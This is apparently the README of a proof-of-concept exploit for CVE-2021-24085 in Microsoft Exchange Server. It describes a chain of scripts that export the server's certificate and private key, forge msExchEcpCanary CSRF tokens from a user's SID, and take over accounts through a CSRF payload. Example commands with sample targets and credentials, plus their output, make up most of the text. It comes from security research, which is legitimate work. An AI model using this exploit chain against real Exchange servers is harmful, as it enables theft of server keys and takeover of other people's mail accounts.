# Microsoft Exchange Server msExchEcpCanary Cross Site Request Forgery Elevation of Privilege Vulnerability

This is a Proof of Concept for CVE-2021-24085.

1. `poc.py` downloads the targets cert file with private key inside
2. `YellowCanary` generates the `msExchEcpCanary` csrf token for a specific user based on the SID
3. `poc.js` is the csrf exploit to trigger an account takeover

I have not provided the `malicifest.xml` file but you can find information on how to generate a malcious manifest file from the available resources in the below references section.

## Example

Access the certificate with private key inside:

```
researcher@srcincite:~$ ./poc.py
(+) usage: ./poc.py <target> <user:pass>
(+) eg: ./poc.py 192.168.75.142 harryh@exchangedemo.com:user123###

researcher@srcincite:~$ ./poc.py 192.168.75.142 harryh@exchangedemo.com:user123###
(+) found the thumbprint: F4EB6AADB8D7C0D12E756BA2E28F90CCACD41299
(+) exported the cert to the target filesystem
(+) saved the cert to testcert.der using password: hax
```

Now you can generate csrf tokens with `YellowCanary` using a target users SID:

```
c:\Users\researcher>poc.exe S-1-5-21-257332918-392067043-4020791575-3104 testcert.der hax

            #====================================================
            # YellowCanary - generate msExchEcpCanary csrf tokens
            #====================================================

security identifier : S-1-5-21-257332918-392067043-4020791575-3104
msExchEcpCanary     : sA0o0nS_C0G_PMdcA_dAd5BdAEL_-NcYhndaAwlhBJFs4a4iKy4sn53azH-O5Ix3F0jnwzZZUsk.
```
  
## References:

- https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/
- https://info.phishlabs.com/blog/office-365-phishing-uses-malicious-app-persist-password-reset
